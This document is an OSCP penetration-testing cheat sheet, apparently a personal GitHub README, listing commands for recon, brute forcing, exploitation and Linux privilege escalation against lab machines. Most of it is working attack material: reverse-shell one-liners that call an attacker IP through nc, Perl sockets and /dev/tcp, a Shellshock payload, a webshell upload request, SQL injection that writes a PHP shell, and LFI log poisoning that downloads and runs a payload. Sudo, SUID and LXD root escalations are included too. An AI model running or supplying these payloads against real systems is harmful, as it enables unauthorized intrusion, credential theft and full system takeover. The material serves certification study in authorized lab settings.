# OSCP-Cheat-Sheets
Preparation OSCP

https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html

https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html

https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html

https://blog.adithyanak.com/oscp-preparation-guide/linux-privilege-escalation

https://hausec.com/pentesting-cheatsheet/#_Toc475368980

https://guide.offsecnewbie.com/5-sql


# Recon

```bash
ping <IP> -R
ping <IP> -c 3 # View TTL
```
```bash
for f in *; do ls -la $f; done
```
```bash
lsoft -i:53
```
### nmap
```bash
nmap -Pn -sT -sV -n <IP> -p- --min-rate 1000 --max-retries 2 --reason
nmap -Pn -sT -sV -sC -n <IP> -p <PORTS> 
nmap -Pn -sT -A -n <IP> -p <PORTS>

nmap -Pn -sT -sV --script http-enum -n <IP> -p <PORT> 
nmap -Pn -sT -sV -n <IP> -p 80 --script http-enum --script-args http-enum.basepath="dev/"

nmap -Pn -sT -n --script smb-enum-shares.nse <IP> -p 135,139,445
nmap -p <PORT> <IP> --script smb-ls --script-args 'share=IPC$'

nmap -sV --script "vuln" -p <PORTS> <IP>

nmap -p25 --script smtp-commands <IP>
nmap --script smtp-enum-users <IP> -p 25

nmap -Pn -sT -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -n <IP> -p 6667,6697,8067 
```

### SMTP 
http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum
```bash
smtp-user-enum -M VRFY -U users.txt -t <IP>
smtp-user-enum -M EXPN -u root -t <IP>
smtp-user-enum -M RCPT  -u root -t <IP>
```

### POP3
```bash
nc -nv 10.10.10.17 110
USER orestis
PASS kHGuERB29DNiNE
STAT  --> Numer of msj
LIST
RETR 1
```

### RPC
```bash
#rpcclient -U "" <IP>
>srvinfo # operating system version
>netshareenumall # enumerate all shares and its paths
>enumdomusers -->rid
>enumdomgroups
>querygroupmem 0x200  --> (rid) *rid group
>queryuser --> 0x1f4 *rid user
>getdompwinfo # smb password policy configured on the server
```


### SMB
```bash
smbclient -L <IP> -N
smbclient //IP/<RESOURCE> -N
smbclient //IP/IPC$ -N
smbclient //<IP>/print$ -N -m SMB2
```
```bash
crackmapexec smb 192.168.135.90 -u '' -p ''
crackmapexec -u 'guest' -p '' --shares $ip
crackmapexec -u 'guest' -p '' --rid-brute 4000 $ip
crackmapexec -u 'guest' -p '' --users $ip
```
```bash
mount -t cifs //<IP>/IPC$ /tmp -o username=null,password=null,domain=WORKGROUP
```
```bash
smbmap -H <IP> -u ''
smbmap -H <IP> -r carpeta
smbmap -H <IP> --download general/file.txt
smbmap -u guest -p '' -H <IP>
```
```bash
enum4linux -a <IP>
enum4linux -u 'guest' -p '' -a <IP>
```

### http
```bash
curl -s -i -k https://<IP>
curl -L <URL> # Code 302
curl -i <URL>
curl -kv -x <PROXY> <URL>
curl --user admin:admin <URL>/system/config/config_inc.php.sample
```
```bash
nikto -h <URL> -C all
```

### http fuzzer directory
/opt/dirsearch/db/dicc.txt

/usr/share/dirb/wordlists/common.txt

/usr/share/seclists/Discovery/Web-Content/big.txt

/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt

/opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
```bash
dirb <URL>
```
```bash
python3 /opt/dirsearch/dirsearch.py -u <URL> -e php,txt -x 403 --random-agents
python3 /opt/dirsearch/dirsearch.py -u <URL> -e php,txt,cgi,sh,txt,xml -f -w /usr/share/wordlists/dirb/big.txt	# Force extension -f
python3 /opt/dirsearch/dirsearch.py -u <URL> -w /usr/share/dirb/wordlists/common.txt -E -f
```
```bash
gobuster -u <URL> -t 50 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php
gobuster -u <URL> -t 50 -w /usr/share/dirb/wordlists/big.txt -x .php -r 	# Follow redirect
gobuster dir -u <URL> -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -k #https
```
```bash
wfuzz -c -t 500 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://<IP>/FUZZ
wfuzz -c -t 500 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w ext.txt http://<IP>/FUZZ.FUZ2Z
wfuzz -c -t 500 --hc=404 --hh=376 -w /opt/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt http://<IP>:8593/index.php?book=FUZZ
wfuzz -c -t 500 --hc=400,404,403 --basic admin:admin -w /opt/dirsearch/db/dicc.txt http://<IP>/system/FUZZ
```

### http cms
https://www.einstijn.com/penetration-testing/website-username-password-brute-forcing-with-hydra/

https://github.com/Dionach/CMSmap

https://github.com/NoorQureshi/WPSeku-1
```bash
wpscan --url <URL> --enumerate p
wpscan --url  http://<IP>/wordpress/ --rua -e ap,u
wpscan --url <URL> --passwords ../../rockyou.txt
python wpseku.py --target http://192.168.149.123/wordpress

wfuzz -c -t 500 --hc=404 -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt  http://<IP>/FUZZ
wfuzz -c -t 500 --hc=404 -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt  http://192.168.84.123/wordpress/FUZZ

https://www.einstijn.com/penetration-testing/website-username-password-brute-forcing-with-hydra/
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:is incorrect"
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-form-post "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.84.123%2Fwordpress%2Fwp-admin%2F&testcookie=1:Lost your password"

49947-cms-made-simple-v2.2.13---paper.pdf
```
```bash
droopescan scan drupal -u <url>
```

### http bypass

https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c

https://medium.com/r3d-buck3t/bypass-ip-restrictions-with-burp-suite-fb4c72ec8e9c

HTTP/1.0 403 Forbidden --> X-Forwarded-for: localhost

```shell
POST /administration/upload/ HTTP/1.1
Host: 192.168.86.138
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.86.138/administration/upload/
Cookie: PHPSESSID=agdfgv7fqdloo98eumakfojgb7
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------10131357035256004441892031456
Content-Length: 378

-----------------------------10131357035256004441892031456
Content-Disposition: form-data; name="document"; filename="webshell.php"
Content-Type: image/png

GIF89:
<?php system(['cmd']); ?>

-----------------------------10131357035256004441892031456
Content-Disposition: form-data; name="submit"
Send
-----------------------------10131357035256004441892031456--
```


# Explotation
```bash
searchsploit <>
```

Paramiko
https://jm33.me/an-rce-approach-of-cve-2018-7750.html

Elastix 2.2.0 LFI
https://www.exploit-db.com/exploits/37637

Druppal CVE-2018-7600
drupalgedddon 
https://github.com/dreadlocked/Drupalgeddon2

https://raw.githubusercontent.com/lorddemon/drupalgeddon2/master/drupalgeddon2.py
```bash
python drupalgeddon2.py -h <URL> -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <MyIP> <PORT> >/tmp/f"

PHP filter # RCE
```

### CMS
Wordpress
1. Insert code PHP in Edit Plugins
2. Appearance --> Template Editor --> Template 404 --> "insert code" --> <url>?p=404
3. Add Plugin --> upload # Upload zip, note: download from wordpress and edit with php shell
4. AdRotate --> Manage Media --> Upload new banner --> shell.php.zip  
http://loly.lc/wordpress/wp-content/banners/php-reverse-shell.php

Review "/uploads" and write perms to shell from mysql or db

Generate pwd
https://www.useotools.com/es/wordpress-password-hash-generator/output
	
```bash
root@kali# cat hash_wp
$P$BE8LMdNTNUfpD5w3h5q2DnGGalSHcY1
john hash_wp --wordlist=/usr/share/wordlists/rockyou.txt
```

### shells
https://netsec.ws/?p=337

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl

https://book.hacktricks.xyz/shells/shells/msfvenom
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf

http://192.168.61.86/?host=;perl -e %20%27use%20Socket;$i=%22192.168.49.61%22;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22%3E%26S%22);open(STDOUT,%22%3E%26S%22);open(STDERR,%22%3E%26S%22);exec(%22/bin/sh%20-i%22);};%27
```

### Brute force
https://book.hacktricks.xyz/brute-force
```bash
john hash_passwd.txt --wordlist=/usr/share/wordlists/rockyou.txt

unshadow passwd shadow > crack
john --wordlist=/usr/share/wordlists/rockyou.txt crack 
```
```bash
# Hash Wordpress 
john hash --wordlist=/usr/share/wordlists/rockyou.txt  --format=phpass
hashcat.exe -O -m 400 -a 0 -o crack.txt hash.txt rockyou.txt
```
```bash
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt --force # $1$ MD5
```
```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> ssh
hydra -f -l root -P /usr/share/wordlists/rockyou.txt 192.168.58.118 mysql -v -V
hydra -l administrator -P /usr/share/wordlists/rockyou.txt <IP> smb
```
Patator 0.6
```bash
patator http_fuzz url=http://<IP>/department/login.php method=POST body='username=admin&password=FILE0' 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep='Invalid Password!'
patator ssh_login host=10.10.10.76 port=22022 user=sammy password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'
```

```bash
ncrack -u seppuku -P password.lst -v ssh://192.168.135.90
```
```bash
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' cathrine.zip 
unzip cathrine.zip
```
```bash
cewl http://192.168.148.80 -m 5 -w words.txt
```

### SSH id_rsa
```bash
chmod 600 id_rsa 
chmod 644 ../keys/private.bak 
ssh -i id_rsa tom@192.168.74.107

/usr/bin/base32 /root/.ssh/id_rsa | base32 --decode

grep -r -l "Welcome to SSH" 2>/dev/null
ls -l /etc/update-motd.d/00-header

id_rsa to VM victim authorized 

```

### http SHELLSOCK
https://www.sevenlayers.com/index.php/125-exploiting-shellshock
```bash
curl -A '() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id' http://<IP>:<PORT>/cgi-bin/helloworld
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' http://192.168.80.87/cgi-bin/test
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/bash -l > /dev/tcp/192.168.49.80/80 0<&1 2>&1' http://<IP>/cgi-bin/test
nmap -sV -Pn -n --script=http-shellshock.nse --script-args uri=/cgi-bin/calendar.cgi <IP> -p80

```

### Tomcat AJP Connector tcp/8009  - Ghostcat
https://www.chaitin.cn/en/ghostcat

https://github.com/00theway/Ghostcat-CNVD-2020-10487
	
### IRC
https://book.hacktricks.xyz/pentesting/pentesting-irc
```bash
nc -vn 192.168.60.120 8067
USER admin o * admin
NICK admin
VERSION
USERS
ADMIN
LIST
WHOIS
```

### SQL
https://guide.offsecnewbie.com/5-sql
```bash
' or 1=1 --
```
```bash
https://guide.offsecnewbie.com/5-sql
sqsh -S 10.11.1.31 -U sa -P poiuytrewq
1> xp_cmdshell 'type c:\users\administrator\desktop\proof.txt'
2> go
1> xp_cmdshell 'whoami'
2> go
admin');exec+master.dbo.xp_dirtree+'\\192.168.119.152\test,3,2';+--
```
Mine data
```
') ORDER BY 2# 
') union select database(),2# 
') union select table_name,2 from information_schema.tables where table_schema = "db_name"# 
') union select column_name,2 from information_schema.columns where table_schema = "db_name" and table_name ="table_name"# 
') union select column_name,2 from information_schema.columns where table_schema = "db_name" and table_name ="table_name" limit 0,1# 
') union select column_name,2 from information_schema.columns where table_schema = "db_name" and table_name ="table_name" limit 1,1# 
') union select column_name,2 from information_schema.columns where table_schema = "db_name" and table_name ="table_name" limit 2,1# 
') union select user_pass,2 from wp_users# 
```

```bash
select load_file('/etc/passwd');
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '/var/www/html/shell.php';
```
```bash
https://cosmiclayton.medium.com/wordpress-plugin-survey-poll-1-5-7-3-sss-params-sql-injection-e342ea7b9cdb
# Wordpress
curl -X POST -d "action=spAjaxResults&pollid=-7159 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,user_pass,NULL from wordpress_db.wp_users --" http://sunset-midnight/wp-admin/admin-ajax.php
```
	
### LFI
https://www.hackingarticles.in/apache-log-poisoning-through-lfi/

https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html
```bash
 curl http://192.168.148.80/console/file.php?file=/etc/passwd
```
```shell
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log

**Logs Apache**
/var/log/apache2/error.log
/var/log/apache2/access.log
other_vhosts_access.log

wfuzz -c -t 500 --hc=404 --hl=0 -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt http://192.168.148.80/console/file.php?file=FUZZ 
/var/log/auth.log
/var/log/apache2/access.log

**Log poisoning**
ssh \<?php\ passthru\(\$_GET[\'cmd\']\)\;\ ?\>@192.168.230.80
http://<IP>/console/file.php?file=/var/log/auth.log&cmd=wget%20http://<MyIP>/shell.elf
http://<IP>/console/file.php?file=/var/log/auth.log&cmd=chmod%20%2bx%20shell.elf
http://<IP>/console/file.php?file=/var/log/auth.log&cmd=./shell.elf

curl --user-agent "<?php system($_GET['cmd']); ?>" http://192.168.135.72
curl http://192.168.135.72:8593/index.php?book=../../../../var/log/apache2/access.log\&cmd=whoami

LFI + PHPinfo
https://www.insomniasec.com/downloads/publications/phpinfolfi.py
https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html

LFI mail
https://guide.offsecnewbie.com/network-pen#things-to-remember
```

### Interactive shell
```bash
script /dev/null -c bash
ctrl + ^Z
stty raw -echo
fg
reset
xterm
export TERM=xterm-256color
export TERM=xterm
export SHELL=bash
stty rows 17 columns 144
```
stty -a # get rows and colummns


### Escape restricted shell
https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/

https://null-byte.wonderhowto.com/how-to/escape-restricted-shell-environments-linux-0341685/
```bash
user@host:~$ vim
:set shell=/bin/sh
:shell

ssh <USER>@<IP> -t "bash --noprofile"
```

### Recon
```bash
cat /etc/passwd | cut -d ':' -f 1,7 | grep "bash\|sh" | grep -v "sshd"
cat /etc/passwd | grep bash
ls -la /etc/passwd
ls -la /etc/shadow

echo "S0tCg==" | base64 -d

base32 --decode "MFZG233VOI5FG2DJMVWGIQBRGIZQ===="
```
 
```bash
binwalk -e save.zip 
steghide --extract -sf haclabs.jpeg -p harder
https://github.com/StefanoDeVuono/steghide
```

	
# Privilege escalation
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
	
https://gtfobins.github.io

https://book.hacktricks.xyz/linux-unix/privilege-escalation

https://github.com/pha5matis/Pentesting-Guide/blob/master/privilege_escalation_-_linux.md

https://github.com/carlospolop/hacktricks/tree/master/linux-unix/privilege-escalation

https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

https://payatu.com/guide-linux-privilege-escalation #MySQL UDF Dynamic Library

https://academy.hackthebox.com/course/preview/linux-privilege-escalation/introduction-to-linux-privilege-escalation

### Local exploits

```bash
cat /etc/issue
cat /etc/lsb-release
uname -r
arch
searchsploit linux kernel ubuntu 16.04

gcc 43418.c -o exploit 
gcc -m64 44298.c -o 44298
gcc -m32 44298.c -o 44298
```

DirtyCow
https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions

DirtyCow - Error cc1
```bash
www-data@ubuntu:/tmp$ gcc -pthread 40839.c -o 40839 -lcrypt  2>&1 | grep cc1
gcc: error trying to exec 'cc1': execvp: No such file or directory
www-data@ubuntu:/tmp$ locate cc1
/usr/lib/gcc/x86_64-linux-gnu/4.6/cc1
www-data@ubuntu:/tmp$ PATH=${PATH}:/usr/lib/gcc/x86_64-linux-gnu/4.6 
www-data@ubuntu:/tmp$ export PATH
www-data@ubuntu:/tmp$ gcc -pthread 40839.c -o 40839 -lcrypt
www-data@ubuntu:/tmp$ ./40839 test
```
DirtyCow - Exploit cowroot 
```bash
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
gcc cowroot.c -o cowroot -pthread
./cowroot 
```
DirtyCow - Exploit dcow 
```bash
https://github.com/gbonacini/CVE-2016-5195/blob/master/dcow.cpp
https://raw.githubusercontent.com/gbonacini/CVE-2016-5195/master/dcow.cpp
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow2 40847.cpp -lutil
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```

Ubuntu 20 5.11 - CVE-2021-3493
```bash
https://bestofcpp.com/repo/inspiringz-CVE-2021-3493-cpp-cryptography

https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
root@kali:/OSCPv3/offsec_pg/SoSimple# gcc -m64 exploit.c -o exploit
root@kali:/OSCPv3/offsec_pg/SoSimple#
max@so-simple:/tmp$ ./exploit
bash-5.0# whoami
root
bash-5.0# 
```

	
### SUID
```bash
$ find / -perm -u=s -type f 2>/dev/null
$ find / -perm -4000 2>/dev/null
$ zsh
$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
$ /usr/bin/base32 /etc/shadow | base32 --decode
$ /usr/bin/base32 /etc/passwd | base32 --decode
$ /usr/bin/base32 /root/.ssh/id_rsa | base32 --decode
$ /usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; exec bash -p")'
$ /usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; chmod u+s /bin/bash")'
```

### Tools 
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

https://github.com/diego-treitos/linux-smart-enumeration

https://github.com/rebootuser/LinEnum

https://github.com/AlessandroZ/BeRoot

https://github.com/sleventyeleven/linuxprivchecker

https://github.com/pentestmonkey/unix-privesc-check

### Files or dirs
```bash
/var/www/html/admin/.htpasswd 
/usr/share/nginx/html/
find /-name *config*.php
/var/www/html/sites/default/settings.php #Drupal
grep -r -i -E "user|pass|auth|key|db|database"
find / -name "*.*" -print0 | xargs -0 grep -i -n "password" 2>/dev/null | grep -v sys | grep -v etc | grep -v usr | grep -v snap | grep -v proc | grep -v lib | grep -v boot | grep -v var | grep -v bin | grep -v run | more
/var/www/html/wp-config.php
```

### SUDO

sudo 1.8.27
```bash
sudo -u#-1 /bin/bash
```
```bash
sudo -l
sudo -u steven /usr/sbin/service ../../bin/bash	#(steven) NOPASSWD: /usr/sbin/service
```
```bash
sudo mysql -e '\! /bin/sh'
sudo /usr/bin/mysql -e 'system bash'
sudo /usr/bin/pkexec /bin/sh
sudo /usr/bin/pkexec chmod u+s /bin/bash
sudo /usr/bin/time /bin/sh
sudo python -c 'import os; os.system("/bin/sh")'
sudo python -c 'import os; os.system("chmod u+s /bin/bash")'
sudo /bin/bash  # (ALL : ALL) ALL

/bin/systemctl start|stop|restart apache2
cat /etc/apache2/apache2.conf | grep <user> # Change user

TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

### Linux capabilities
https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities

https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'

cat /proc/16323/status | grep Cap
capsh --decode=0000003fffffffff
getpcaps 16323
getcap /usr/bin/python2.7 

#Set Capability
setcap cap_net_raw+ep /sbin/ping
#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep

capsh --print
```

### Python exec
https://www.geeksforgeeks.org/exec-in-python/
```bash
lucy@pyexp:~$ more /opt/exp.py 
uinput = raw_input('how are you?')
exec(uinput)

lucy@pyexp:~$ sudo /usr/bin/python2 /opt/exp.py 
how are you?import os;os.system('chmod u+s /bin/bash')
lucy@pyexp:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

### Write files or dirs
```bash
find / -perm -2 -type f 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
	
find / -readable -type f 2>/dev/null  | grep -v sys | grep -v etc | grep -v usr | grep -v snap | grep -v proc | grep -v lib | grep -v boot | grep -v var | grep -v bin | grep -v run | more
	
find / -type f -user yash
find / -type f -user <USER>
```

### Scheduled tasks
https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32s

https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s

Check writables
```bash
cat /etc/crontab 
crontab -u <user> -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
ls -la /usr/local/sbin/cron-logrotate.sh
grep "CRON" /var/log/cron.log

ps -aux | more
funny@funbox:/var/log$ cat syslog | grep backup
```
```bash
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
	sleep 1
	old_process=$new_process
done
```

### Containers
https://www.hackingarticles.in/lxd-privilege-escalation/

https://p0i5on8.github.io/posts/hackthebox-brainfuck/
```bash
kali$ id
kali$ git clone https://github.com/saghul/lxd-alpine-builder.git
kali$ cd lxd-alpine-builder/
kali$ sudo ./build-alpine
bash$ wget http://<MyIP>:9090/alpine-v3.14-i686-20211105_0009.tar.gz  # MV InfosecPrep/lxd-alpine-builder
bash$ /snap/bin/lxc image import /tmp/alpine-v3.14-i686-20211105_0009.tar.gz --alias imagen
bash$ /snap/bin/lxc init imagen ignite -c security.privileged=true
//if error
bash$ /snap/bin/lxc storage create pool dir
bash$ /snap/bin/lxc init imagen ignite -c security.privileged=true
bash$ /snap/bin/lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
	
	
max@so-simple:/tmp$ /snap/bin/lxc init imagen ignite -c security.privileged=true
Creating ignite
Error: Create instance: Create instance: Invalid devices: Failed detecting root disk device: No root device could be found
//if error
max@so-simple:/tmp$ /snap/bin/lxc image list
max@so-simple:/tmp$ /snap/bin/lxc profile show default
max@so-simple:/tmp$ /snap/bin/lxc storage list
max@so-simple:/tmp$ /snap/bin/lxc profile device add default root disk path=/ pool=pool	# "pool" get from "lxc storage list"
/snap/bin/lxc init imagen ignite -c security.privileged=true
/snap/bin/lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
/snap/bin/lxc start ignite
/snap/bin/lxc exec ignite /bin/sh
```

### Chrootkit
https://vk9-sec.com/chkrootkit-0-49-local-privilege-escalation-cve-2014-0476/
```bash
chkrootkit -V
echo 'chmod u+s /bin/bash' > /tmp/update
chmod 777 /tmp/update
# execute the chkrootkit command for a cron job
```

### SUID personal binary 
```bash
jose@midnight:~$ strings /usr/bin/status | grep service		# binary status execute service command
service ssh status
jose@midnight:~$ export PATH=/tmp/:$PATH
jose@midnight:/tmp$ echo "chmod u+s /bin/bash" > service
jose@midnight:/tmp$ chmod +x service
jose@midnight:/tmp$ /usr/bin/status
```
	
### Cipher
https://www.dcode.fr/cipher-identifier

https://gchq.github.io/CyberChef/

https://www.tunnelsup.com/hash-analyzer/

https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm

https://asecuritysite.com/encryption/ferdecode

MD5 hashes.org
https://cryptii.com/pipes/caesar-cipher

### Buffer Overflow
https://github.com/Arken2/Everything-OSCP/blob/master/Checklists/WindowsBufferOverflowChecklist.pdf
